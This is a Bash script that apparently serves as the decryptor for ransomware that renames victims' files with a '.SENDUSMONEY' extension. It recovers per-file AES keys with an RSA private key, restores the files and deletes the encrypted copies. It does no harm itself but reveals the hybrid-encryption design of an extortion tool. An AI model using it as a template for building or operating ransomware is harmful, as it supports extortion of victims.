#!/bin/bash

export PATH=/run/current-system/sw/bin/
shopt -s globstar

sk="./sk.pem"

decrypt_file() {
	local encrypted_file="$1"
	local key_file="$encrypted_file.key"
	local decrypted_file="${encrypted_file%.SENDUSMONEY}"

	if [[ ! -f "$key_file" ]]; then
		echo "Missing key file for: $encrypted_file"
		return 1
	fi

	local sym_key
	sym_key=$(openssl pkeyutl -decrypt -inkey "$sk" -in "$key_file" 2>/dev/null)

	if [[ -z "$sym_key" ]]; then
		echo "Failed to decrypt symmetric key for: $encrypted_file"
		return 1
	fi

	openssl enc -aes-256-cbc -d -salt -in "$encrypted_file" -out "$decrypted_file" -pass pass:"$sym_key" 2>/dev/null
	if [[ $? -eq 0 ]]; then
		echo "Decrypted: $decrypted_file"
		rm -f "$encrypted_file" "$key_file" # Optionally remove encrypted file and key
	else
		echo "Failed to decrypt file: $encrypted_file"
	fi
}

# Decrypt all encrypted files in the specified directories
for encrypted_file in /home/**/*.SENDUSMONEY /tmp/**/*.SENDUSMONEY /root/**/*.SENDUSMONEY /etc/www/**/*.SENDUSMONEY /var/log/**/*.SENDUSMONEY; do
	if [[ -f "$encrypted_file" ]]; then
		decrypt_file "$encrypted_file"
	fi
done
